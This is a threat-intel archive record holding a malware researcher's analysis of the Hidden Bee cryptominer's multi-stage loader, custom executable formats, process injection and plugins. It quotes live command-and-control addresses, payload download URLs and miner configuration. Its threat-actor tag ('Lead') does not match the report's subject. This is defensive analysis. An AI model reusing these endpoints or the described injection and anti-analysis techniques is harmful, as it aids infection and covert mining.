{
    "id": "8a8793de-b911-450a-9de2-ddac56d20d29",
    "created_at": "2023-01-12T15:07:17.777737Z",
    "updated_at": "2025-03-27T02:08:41.524156Z",
    "deleted_at": null,
    "sha1_hash": "05637c6e061ab3e3ee5d81b98da909cf9e2965b1",
    "title": "2019-05-31 - Hidden Bee- Let’s go down the rabbit hole",
    "authors": "",
    "file_creation_date": "2022-05-28T02:32:46Z",
    "file_modification_date": "2022-05-28T02:32:46Z",
    "file_size": 1820161,
    "plain_text": "# Hidden Bee: Let’s go down the rabbit hole\n\n**[blog.malwarebytes.com/threat-analysis/2019/05/hidden-bee-lets-go-down-the-rabbit-hole/](https://blog.malwarebytes.com/threat-analysis/2019/05/hidden-bee-lets-go-down-the-rabbit-hole/)**\n\nhasherezade May 31, 2019\n\n[Some time ago, we discussed the interesting malware, Hidden Bee. It is a Chinese miner,](https://blog.malwarebytes.com/threat-analysis/2018/08/reversing-malware-in-a-custom-format-hidden-bee-elements/)\ncomposed of userland components, as well as of a bootkit part. One of its unique features is\na custom format used for some of the high-level elements (this format was featured in my\nrecent presentation at SAS).\n\nRecently, we stumbled upon a new sample of Hidden Bee. As it turns out, its authors\ndecided to redesign some elements, as well as the used formats. In this post, we will take a\ndeep dive in the functionality of the loader and the included changes.\n\n## Sample\n\n[831d0b55ebeb5e9ae19732e18041aa54 – shared by @James_inthe_box](https://www.virustotal.com/#/file/fd9edb6d9ac9674e797e51b3767e45a2eb23343c2ce88e64ef20d26f641064af/detection)\n\n## Overview\n\nThe Hidden Bee runs silently—only increased processor usage can hint that the system is\ninfected. More can be revealed with the help of tools inspecting the memory of running\nprocesses.\n\nInitially, the main sample installs itself as a Windows service:\n\n\n-----\n\nHidden Bee service\nHowever, once the next component is downloaded, this service is removed.\n\nThe payloads are injected into several applications, such as svchost.exe, msdtc.exe,\ndllhost.exe, and WmiPrvSE.exe.\n\nIf we scan the system with [hollows_hunter, we can see that there are some implants in the](https://github.com/hasherezade/hollows_hunter)\nmemory of those processes:\n\nResults of the\n\nscan by hollows_hunter\nIndeed, if we take a look inside each process’ memory (with the help of Process Hacker), we\ncan see atypical executable elements:\n\n\n-----\n\nHidden Bee implants are placed in RWX memory\nSome of them are lacking typical PE headers, for example:\n\nExecutable in one of the multiple customized formats used by Hidden Bee\nBut in addition to this, we can also find PE files implanted at unusual addresses in the\nmemory:\n\nManually-loaded PE files in the memory of WmiPrvSE.exe\n\n\n-----\n\n[Those manually-loaded PE files turned out to be legitimate DLLs: OpenCL.dll and](https://www.virustotal.com/#/file/bc0d5b5d63cf39bf2da62271f7ff8615bfd550a803a72ea70204746e03bfdfd2/details)\n[cudart32_80.dll (NVIDIA CUDA Runtime, Version 8.0.61 ). CUDA is a technology belonging](https://www.virustotal.com/#/file/88931308f09fb89222a5a84e5ad9b6074f43db5dbc0f0f6321c5b58691dff2df/details)\nto NVidia graphic cards. So, their presence suggests that the malware uses GPU in order to\nboost the mining performance.\n\nWhen we inspect the memory even closer, we see within the executable implants there are\nsome strings referencing LUA components:\n\nStrings referencing LUA scripting language, used by Hidden Bee components\nThose strings are typical for the Hidden Bee miner, and they were also mentioned in the\nprevious reports.\n\nWe can also see the strings referencing the mining activity, i.e. the Cryptonight miner.\n\n\n-----\n\nList of modules:\n```\nbin/i386/coredll.bin\ndispatcher.lua\nbin/i386/ocl_detect.bin\nbin/i386/cuda_detect.bin\nbin/amd64/coredll.bin\nbin/amd64/algo_cn_ocl.bin\nlib/amd64/cudart64_80.dll\nsrc/cryptonight.cl\nsrc/cryptonight_r.cl\nbin/i386/algo_cn_ocl.bin\nconfig.lua\nlib/i386/cudart32_80.dll\nsrc/CryptonightR.cu\nbin/i386/algo_cn.bin\nbin/amd64/precomp.bin\nbin/amd64/ocl_detect.bin\nbin/amd64/cuda_detect.bin\nlib/amd64/opencl.dll\nlib/i386/opencl.dll\nbin/amd64/algo_cn.bin\nbin/i386/precomp.bin\n\n```\n\n-----\n\nAnd we can even retrieve the miner configuration:\n\nconfiguration.set(\"stratum.connect.timeout\",20)\n\nconfiguration.set(\"stratum.login.timeout\",60)\n\nconfiguration.set(\"stratum.keepalive.timeout\",240)\n\nconfiguration.set(\"stratum.stream.timeout\",360)\n\nconfiguration.set(\"stratum.keepalive\",true)\n\nconfiguration.set(\"job.idle.count\",30)\n\nconfiguration.set(\"stratum.lock.count\",30)\n\nconfiguration.set(\"miner.protocol\",\"stratum+ssl://r.twotouchauthentication.online:17555/\")\n\nconfiguration.set(\"miner.username\",configuration.uuid())\n\nconfiguration.set(\"miner.password\",\"x\")\n\nconfiguration.set(\"miner.agent\",\"MinGate/5.1\")\n\n[view raw](https://gist.github.com/malwarezone/b83a5db804aa2379f4a4647aab18f771/raw/2b96dc5e3ef2029c315bba7deb57c07cd6cf9c26/config.lua) [config.lua hosted with ❤ by](https://gist.github.com/malwarezone/b83a5db804aa2379f4a4647aab18f771#file-config-lua) [GitHub](https://github.com/)\n\n## Inside\n\nHidden Bee has a long chain of components that finally lead to loading of the miner. On the\nway, we will find a variety of customized formats: data packages, executables, and\nfilesystems. The filesystems are going to be mounted in the memory of the malware, and\nadditional plugins and configuration are retrieved from there. Hidden Bee communicates with\nthe C&C to retrieve the modules—on the way also using its own TCP-based protocol.\n\nThe first part of the loading process is described by the following diagram:\n\n\n-----\n\nEach of the .spk packages contains a custom ‘SPUTNIK’ filesystem, containing more\nexecutable modules.\n\n\n-----\n\nStarting the analysis from the loader, we will go down to the plugins, showing the inner\nworkings of each element taking part in the loading process.\n\n## The loader\n\nIn contrast to most of the malware that we see nowadays, the loader is not packed by any\ncrypter. According the header, it was compiled in November 2018.\n\nWhile in the former edition the modules in the custom formats were dropped as separate\nfiles, this time the next stage is unpacked from inside the loader.\n\n\n-----\n\nThe loader is not obfuscated. Once we load it with typical tools (IDA), we can clearly see how\nthe new format is loaded.\n\nThe loading function\n\nSection .shared contains the configuration:\n\nEncrypted configuration. The last 16 bytes after the data block is the key.\nThe configuration is decrypted with the help of XTEA algorithm.\n\n\n-----\n\nDecrypting the configuration\n\nThe decrypted configuration must start from the magic WORD “pZ.” It contains the C&C and\nthe name under which the service will be installed:\n\n**Unscrambling the NE format**\n\nThe NE format [was seen before, in former editions of Hidden Bee. It is just a scrambled](https://www.freebuf.com/column/174581.html)\nversion of the PE. By observing which fields have been misplaced, we can easily reconstruct\nthe original PE.\n\n\n-----\n\nThe\n\nloader, unpacking the next stage\nNE is one of the two similar formats being used by this malware. Another similar one starts\nfrom a DWORD 0x0EF1FAB9 and is used to further load components. Both of them have an\nanalogical structure that comes from slightly modified PE format:\n\nHeader:\n```\nWORD magic; // 'NE'\nWORD pe_offset;\nWORD machine_id;\n\n```\n\n-----\n\nThe conversion back to PE format is trivial: It is enough to add the erased magic numbers:\nMZ and PE, and to move displaced fields to their original offsets. The tool that automatically\n[does the mentioned conversion is available here.](https://github.com/hasherezade/bee_parser/tree/master/bee_lvl2_converter)\n\nIn the previous edition, the parts of Hidden Bee with analogical functionality were delivered in\na different, more complex [proprietary format than the one currently being analyzed.](https://blog.malwarebytes.com/threat-analysis/2018/08/reversing-malware-in-a-custom-format-hidden-bee-elements/)\n\n**Second stage: a downloader (in NE format)**\n\nAs a result of the conversion, we get the following PE:\n[(fddfd292eaf33a490224ebe5371d3275). This module is a downloader of the next stage. The](https://www.virustotal.com/#/file/3a1c218de4d653dff06a68cfc12b958766dcb869450c9dd06928be819beb365c/details)\ninteresting thing is that the subsystem of this module is set as a driver, however, it is not\nloaded like a typical driver. The custom loader loads it into a user space just like any typical\nuserland component.\n\nThe function at the module’s Entry Point is called with three parameters. The first is a path of\nthe main module. Then, the parameters from the configuration are passed. Example:\n```\n0012FE9C   00601A34 UNICODE \"\\\"C:\\Users\\tester\\Desktop\\new_bee.exe\\\"\"\n0012FEA0   00407104 UNICODE \"NAPCUYWKOxywEgrO\"\n0012FEA4   00407004 UNICODE \"118.41.45.124:9000\"\n\n```\nCalling the Entry Point of the manually-loaded NE module\nThe execution of the module can take one of the two paths. The first one is meant for adding\npersistence: The module installs itself as a service.\n\nIf the module detects that it is already running as a service, it takes the second path. In such\na case, it proceeds to download the next module from the server. The next module is packed\nas as Cabinet file.\n\n\n-----\n\nThe\n\ndownloaded Cabinet file is being passed to the unpacking function\nIt is first unpacked into a file named “core.sdb”. The unpacked module is in a customized\nformat based on PE. This time, the format has a different signature: “NS” and it is different\nfrom the aforementioned “NE” format (detailed explanation will be given further).\n\nIt is loaded by the proprietary loader.\n\n\n-----\n\nThe loader enumerates all the executables in a directory: `%Systemroot%\\Microsoft.NET\\`\nand selects the ones with the compatible bitness (in the analyzed case it was selecting 32bit\nPEs). Once it finds a suitable PE, it runs it and injects the payload there. The injected code is\nrun by adding its entry point to APC queue.\n\nHidden Bee component injecting the next stage (core.sdb) into a new process\nIn case it failed to find the suitable executable in that directory, it performs the injection into\ndllhost.exe instead.\n\n**Unscrambling the NS format**\n\nAs mentioned before, the core.sdb is in yet another format named NS. It is also a customized\nPE, however, this time the conversion is more complex than the NE format because more\nstructures are customized. It looks like a next step in the evolution of the NE format.\n\nHeader of the NS format\n\n\n-----\n\nWe can see that the changes in the PE headers are bigger and more lossy—only minimalist\ninformation is maintained. Only few Data Directories are left. Also the sections table is\nshrunk: Each section header contains only four out of nine fields that are in the original PE.\n\nAdditionally, the format allows to pass a runtime argument from the loader to the payload via\nheader: The pointer is saved into an additional field (marked “Filled Data” on the picture).\n\nNot only is the PE header shrunk. Similar customization is done on the Import Table:\n\nCustomized part of the NS format’s import table\nThis custom format can also be converted back to the PE format with the help of a dedicated\n[converter, available here.](https://github.com/hasherezade/bee_parser/tree/master/bee_lvl2_converter)\n\n**Third stage: core.sdb**\n\nThe core.sdb module converted to PE format is available here:\n[a17645fac4bcb5253f36a654ea369bf9.](https://malshare.com/sample.php?action=detail&hash=a17645fac4bcb5253f36a654ea369bf9)\n\nThe interesting part is that the external loader does not complete the full loading process of\nthe module. It only copies the sections. But the rest of the module loading, such as applying\nrelocations and filling imports, is done internally in the core.sdb.\n\nThe loading function is just at the Entry Point of\n\ncore.sdb\nThe previous component was supposed to pass to the core.sdb an additional buffer with the\ndata about the installed service: the name and the path. During its execution, core.sdb will\nlook up this data. If found, it will delete the previously-created service, and the initial file that\nstarted the infection:\n\n\n-----\n\nRemoving the initial\n\nservice\nGetting rid of the previous persistence method suggests that it will be replaced by some\ndifferent technique. Knowing previous editions of Hidden Bee, we can suspect that it may be\na bootkit.\n\nAfter locking the mutex in a format Global\\SC_{%08lx-%04x-%04x-%02x%02x%02x%02x%02x%02x%02x%02x}, the module proceeds to download another component.\nBut before it goes to download, first, a few things are checked.\n\n\n-----\n\nChecks done before download of the next module\nFirst of all, there is a defensive check if any of the known debuggers or sniffers are running.\nIf so, the function quits.\n\nThe blacklist\nAlso, there is a check if the application can open a file ‘\\??\\NPF-{0179AC45-C226-48e3A205-DCA79C824051}’.\n\nIf all the checks pass, the function proceeds and queries the following URL, where GET\nvariables contain the system fingerprint:\n```\nsltp://bbs.favcom.space:1108/setup.bin?\nid=999&sid=0&sz=a7854b960e59efdaa670520bb9602f87&os=65542&ar=0\n\n```\n\n-----\n\nThe hash (sz=) is an MD5 generated from VolumeIDs. Then follows the (os=) identifying\nversion of the operating system, and the identifier of the architecture (ar=), where 0 means\n32 bit, 1 means 64bit.\n\nThe content downloaded from this URL (starting from a magic DWORD 0xFEEDFACE –\n[79e851622ac5298198c04034465017c0) contains the encrypted package (in !rbx format),](https://malshare.com/sample.php?action=detail&hash=79e851622ac5298198c04034465017c0)\nand a shellcode that will be used to unpack it. The shellcode is loaded to the current process\nand then executed.\n\nThe\n\n‘FEEDFACE’ module contains the shellcode to be loaded\nThe shellcode’s start function uses three parameters: pointer to the functions in the previous\nmodule (core sdb), pointer to the buffer with encrypted data, size of the encrypted data.\n\nThe loader\n\ncalling the shellcode\n\n**Fourth stage: the shellcode decrypting !rbx**\n\nThe beginning of the loaded shellcode:\n\n\n-----\n\nThe shellcode does not fill any imports by itself. Instead, it fully relies on the functions from\ncore.sdb module, to which it passes the pointer. It makes use of the following function:\nmalloc, mecpy, memfree, VirtualAlloc.\n\nExample:\n\ncalling malloc via core.sdb\nIts role is to reveal another part. It comes in an encrypted package starting from a marker\n!rbx. The decryption function is called just at the beginning:\n\nCalling the decrypting function (at\n\nEntry Point of the shellcode)\nFirst, the function checks the !rbx marker and the checksum at the beginning of the\nencrypted buffer:\n\n\n-----\n\nChecking\n\nmarker and then checksum\nIt is decrypted with the help of RC4 algorithm, and then decompressed.\n\nAfter decryption, the markers at the beginning of the buffer are checked. The expected\nformat must start from predefined magic DWORDs: 0xCAFEBABE,0, 0xBABECAFE:\n\n\n-----\n\n**The !rbx package format**\n\nThe !rbx is also a custom format with a consistent structure.\n```\nDWORD magic; // \"!rbx\"\nDWORD checksum;\nDWORD content_size;\nBYTE rc4_key[16];\nDWORD out_size;\nBYTE content[];\n\n```\n**The custom file system (BABECAFE)**\n\n\n-----\n\n[The full decrypted content has a consistent structure, reminiscent of a file system. According](https://malshare.com/sample.php?action=detail&hash=a93c90a210aed61255dc34102335af8d)\nto the previous reports, earlier versions of Hidden Bee used to adapt the ROMS filesystem,\nadding few modifications. They called their customized version “Mixed ROM FS”. Now it\nseems that their customization process has progressed. Also the keywords suggesting\nROMFS cannot be found. The headers starts from the markers in the form of three\nDWORDS: { 0xCAFEBABE, 0, 0xBABECAFE }.\n\nThe layout of BABECAFE FS:\n\n\n-----\n\nWe notice that it differs at many points from [ROM FS, from which it evolved.](http://lxr.linux.no/#linux+v4.15.14/Documentation/filesystems/romfs.txt)\n\nThe structure contains the following files:\n\n/bin/amd64/coredll.bin\n/bin/i386/coredll.bin\n/bin/i386/preload\n/bin/amd64/preload\n/pkg/sputnik.spk\n[/installer/com_x86.dll (6177bc527853fe0f648efd17534dd28b)](https://www.virustotal.com/#/file/04d62f3c9ab18370184a5aad9717434b5a8f71abadb92fcbc00b04d7dfa49a7d/details)\n/installer/com_x64.dll\n/pkg/plugins.spk\n\nThe files /pkg/sputnik.spk and /pkg/plugins.spk are both compressed packages in a custom\n!rsi format.\n\nBeginning of the !rsi package in the BABECAFE FS\nEach of the spk packages contain another custom filesystem, identified by the keyword\nSPUTNIK (possibly the extension ‘spk’ is derived from the SPUTNIK format). They will be\nunpacked during the next steps of the execution.\n\n[Unpacked plugins.spk: 4c01273fb77550132c42737912cbeb36](https://malshare.com/sample.php?action=detail&hash=4c01273fb77550132c42737912cbeb36)\n[Unpacked sputnik.spk: 36f3247dad5ec73ed49c83e04b120523.](https://malshare.com/sample.php?action=detail&hash=36f3247dad5ec73ed49c83e04b120523)\n\n**Selecting and running modules**\n\nSome executables stored in the filesystem are in two version: 32 and 64 bit. Only the\nmodules relevant to the current architecture are loaded. So, in the analyzed case, the loader\nchooses first: /bin/i386/preload (shellcode) and /bin/i386/coredll.bin (a module in NS custom\nformat). The names are hardcoded in the loader within the loading shellcode:\n\n\n-----\n\nSearching the modules in the custom file system\nAfter the proper elements are fetched (preload and coredll.bin), they are copied together into\na newly-allocated memory area. The coredll.bin is copied just after preload. Then, the\npreload module is called:\n\nRedirecting execution to\n\npreload\nThe preload is position-independent, and its execution starts from the beginning of the page.\n\n\n-----\n\nEntering\n\n‘preload’\nThe only role of this shellcode is to prepare and run the coredll.bin. So, it contains a custom\nloader for the NS format that allocates another memory area and loads the NS file there.\n\n**Fifth stage: preload and coredll**\n\nAfter loading coredll, preload redirects the execution there.\n\ncoredll at its\n\nEntry Point\nThe coredll patches a function inside the NTDLL— KiUserExceptionDispatcher—redirecting\none of the inner calls to its own code:\n\n\n-----\n\nA patch inside KiUserExceptionDispatcher\nDepending on which process the coredll was injected into, it can take one of a few paths of\nexecution.\n\nIf it is running for the first time, it will try to inject itself again—this time into rundll32. For the\npurpose of the injection, it will again unpack the original !rbx package and use its original\ncopy stored there.\n\nEntering the unpacking function\n\nInside the unpacking function: checking the\n\nmagic “!rbx”\nThen it will choose the modules depending on the bitness of the rundll32:\n\n\n-----\n\nIt selects the pair of modules (preload/coredll.bin) appropriate for the architecture, either from\nthe directory amd64 or from i386:\n\nIf the injection failed, it makes another attempt, this time trying to inject into dllhost:\n\n\n-----\n\nEach time it uses the same, hardcoded parameter ( /Processid: {...} ) that is passed to\nthe created process:\n\nThe thread context of the target process is modified, and then the thread is resumed, running\nthe injected content:\n\nNow, when we look inside the memory of rundll32, we can find the preload and coredll being\nmapped:\n\n\n-----\n\nInside the injected part, the execution follows a similar path: preload loads the coredll and\nredirects to its Entry Point. But then, another path of execution is taken.\n\nThe parameter passed to the coredll decides which round of execution it is. On the second\nround, another injection is made: this time to dllhost.exe. And finally, it proceeds to the final\nround, when other modules are unpacked from the BABECAFE filesystem.\n\n\n-----\n\nParameter deciding which path to take\nThe unpacking function first searches by name for two more modules: sputnik.spk and\nplugins.spk. They are both in the mysterious !rsi format, which reminds us of !rbx, but has a\nslightly different structure.\n\n\n-----\n\nEntering the function unpacking the first !rsi package:\n\nThe function unpacking the !rsi format is structured similarly to the !rbx unpacking. It also\nstarts from checking the keyword:\n\n\n-----\n\nChecking “!rsi”\n\nkeyword\nAs mentioned before, both !rsi packages are used to store filesystems marked with the\nkeyword “SPUTNIK”. It is another custom filesystem invented by the Hidden Bee authors that\ncontain additional modules.\n\nThe “SPUTNIK” keyword is checked after the\n\nmodule is unpacked\nUnpacking the sputnik.spk resulted in getting the following SPUTNIK module:\n[455738924b7665e1c15e30cf73c9c377](https://malshare.com/sample.php?action=detail&hash=455738924b7665e1c15e30cf73c9c377)\n\nIt is worth noting that the unpacked filesystem has inside of it four executables: two pairs\nconsisting of NS and PE, appropriately 32 and 64 bit. In the currently-analyzed setup, 32 bit\nversions are deployed.\n\nThe NS module will be the next to be run. First, it is loaded by the current executable, and\nthen the execution is redirected there. Interestingly, both !rsi modules are passed as\narguments to the entry point of the new module. (They will be used later to retrieve more\n\n\n-----\n\ncomponents.)\n\nnewly-loaded NS executable\n\n**Sixth stage: mpsi.dll (unpacked from SPUTNIK)**\n\nEntering into the NS module starts another layer of the malware:\n\n\nCalling the\n\n\nEntry Point of the NS module: the !rsi modules, perpended with their size, are passed\nThe analyzed module, converted to PE is available here:\n[537523ee256824e371d0bc16298b3849](https://malshare.com/sample.php?action=detail&hash=455738924b7665e1c15e30cf73c9c377)\n\n\n-----\n\nThis module is responsible for loading plugins. It will also create a named pipe through which\nit is will communicate with other modules. It sets up the commands that are going to be\nexecuted on demand.\n\nThis is how the beginning of the main function looks:\n\nLike in previous cases, it starts from finishing to load itself (relocations and imports). Then, it\npatches the function in NTDLL. This is a common prolog in many HiddenBee modules.\n\nThen, we have another phase of loading elements from the supplied packages. The path that\nwill be taken depends on the runtime arguments. If the function received both !rsi packages,\nit will start by parsing one of them, retrieving loading submodules.\n\nFirst, the SPUTNIK filesystem must be unpacked from the !rsi package:\n\n\n-----\n\nAfter being unpacked, it is mounted. The filesystems are mounted internally in the memory:\nA global structure is filled with pointers to appropriate elements of the filesystem.\n\n\n-----\n\nAt the beginning, we can see the list of the plugins that are going to be loaded:\n[cloudcompute.api,](https://malshare.com/sample.php?action=detail&hash=62a44aace15cb728f1f5f96a1c2a4a37) [deepfreeze.api, and](https://malshare.com/sample.php?action=detail&hash=95a2387f103608f6eebcc64a01aefece) [netscan.api. Those names are being appended to](https://malshare.com/sample.php?action=detail&hash=4b2d33b818f53377620ac159e9f8a613)\nthe root path of the modules.\n\nEach module is fetched from the mounted filesystem and loaded:\n\n\n-----\n\nCalling the function to load the plugin\nConsecutive modules are loaded one after another in the same executable memory area.\nAfter the module is loaded, its header is erased. It is a common technique used in order to\nmake dumping of the payload from the memory more difficult.\n\nThe cloudcompute.api is a plugin that will load the miner. More about the plugins will be\nexplained in the next section of this post.\n\nReading its code, we find out that the SPUTNIK modules are filesystems that can be\nmounted and dismounted on demand. This module will be communicating with others with\nthe help of a named pipe. It will be receiving commands and executing appropriate handlers.\n\nInitialization of the commands’ parser:\n\nThe function setting up the commands: For each name, a handler is registered. (This is\n[probably the Lua dispatcher, first described here.)](https://www.freebuf.com/column/175106.html)\n\n\n-----\n\nWhen plugins are run, we can see some additional child processes created by the process\nrunning the coredll (in the analyzed case it is inside rundll32):\n\nAlso it triggers a firewall alert, which means the malware requested to open some ports\n(triggered by netscan.api plugin):\n\n\n-----\n\nWe can see that it started listening on one TCP and one UDP port:\n\n## The plugins\n\nAs mentioned in the previous section, the SPUTNIK filesystem contains three plugins:\n[cloudcompute.api,](https://malshare.com/sample.php?action=detail&hash=62a44aace15cb728f1f5f96a1c2a4a37) [deepfreeze.api, and](https://malshare.com/sample.php?action=detail&hash=95a2387f103608f6eebcc64a01aefece) [netscan.api. If we convert them to PE, we can see](https://malshare.com/sample.php?action=detail&hash=4b2d33b818f53377620ac159e9f8a613)\nthat all of them import an unknown DLL: mpsi.dll. When we see the filled import table, we\nfind out that the addresses have been filled redirecting to the functions from the previous NS\nmodule:\n\n\n-----\n\nSo we can conclude that the previous element is the mpsi.dll. Although its export table has\nbeen destroyed, the functions are fetched by the custom loader and filled in the import tables\nof the loaded plugins.\n\nFirst the cloudcompute.api is run.\n\nThis plugin retrieves from the filesystem a file named “/etc/ccmain.json” that contains the list\nof URLs:\n\nThose are addresses from which another set of modules is going to be downloaded:\n```\n[\"sstp://news.onetouchauthentication.online:443/mlf_plug.zip.sig\",\"sstp://news.onetouc\n\n```\n\n-----\n\nIt also retrieves another component from the SPUTNIK filesystem: /bin/i386/ccmain.bin. This\ntime, it is an executable in NE format (version converted to PE is available here:\n[367db629beedf528adaa021bdb7c12de)](https://malshare.com/sample.php?action=detail&hash=367db629beedf528adaa021bdb7c12de)\n\nThis is the component that is injected into msdtc.exe.\n\nThe\n\nHiddenBee module mapped into msdtc.exe\nThe configuration is also copied into the remote process and is used to retrieve an additional\npackage from the C&C:\n\n\n-----\n\nThis is the plugin responsible for downloading and deploying the Mellifera Miner: core\ncomponent of the Hidden Bee.\n\nNext, the netscan.api loads module /bin/i386/kernelbase.bin (converted to PE:\n[d7516ad354a3be2299759cd21e161a04)](https://malshare.com/sample.php?action=detail&hash=d7516ad354a3be2299759cd21e161a04)\n\n## The miner in APT-style\n\n\n-----\n\nHidden Bee is an eclectic malware. Although it is a commodity malware used for\ncryptocurrency mining, its design reminds us of espionage platforms used by APTs. Going\nthrough all its components is exhausting, but also fascinating. The authors are highly\nprofessional, not only as individuals but also as a team, because the design is consistent in\nall its complexity.\n\n## Appendix\n\n[https://github.com/hasherezade/hidden_bee_tools – helper tools for parsing and converting](https://github.com/hasherezade/hidden_bee_tools)\nHidden Bee custom formats\n\nhttps://www.bleepingcomputer.com/news/security/new-underminer-exploit-kit-discoveredpushing-bootkits-and-coinminers/\n\nArticles about the previous version (in Chinese):\n\nOur first encounter with the Hidden Bee:\n\nhttps://blog.malwarebytes.com/threat-analysis/2018/07/hidden-bee-miner-delivered-viaimproved-drive-by-download-toolkit/\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-31 - Hidden Bee- Let’s go down the rabbit hole.pdf"
    ],
    "report_names": [
        "2019-05-31 - Hidden Bee- Let’s go down the rabbit hole.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536037,
    "ts_updated_at": 1743041321,
    "ts_creation_date": 1653705166,
    "ts_modification_date": 1653705166,
    "files": {
        "pdf": "https://archive.orkl.eu/05637c6e061ab3e3ee5d81b98da909cf9e2965b1.pdf",
        "text": "https://archive.orkl.eu/05637c6e061ab3e3ee5d81b98da909cf9e2965b1.txt",
        "img": "https://archive.orkl.eu/05637c6e061ab3e3ee5d81b98da909cf9e2965b1.jpg"
    }
}